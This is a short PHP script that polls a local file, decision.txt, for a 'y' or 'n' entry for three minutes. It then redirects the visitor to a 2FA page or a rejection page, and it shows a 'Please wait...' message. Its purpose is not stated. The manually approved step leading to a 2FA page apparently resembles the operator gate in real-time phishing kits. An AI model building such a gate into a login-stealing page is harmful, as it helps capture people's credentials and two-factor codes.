<?php
$decisionFile = "decision.txt";
$timeout = 180; // 3 minutes
$start = time();

while ((time() - $start) < $timeout) {
    if (file_exists($decisionFile)) {
        $decision = trim(file_get_contents($decisionFile));
        if ($decision === "y") {
            header("Location: 2fa.php");
            exit();
        } elseif ($decision === "n") {
            header("Location: rejected.php");
            exit();
        }
    }
    sleep(1);
}
?>
<h2>Please wait...</h2>
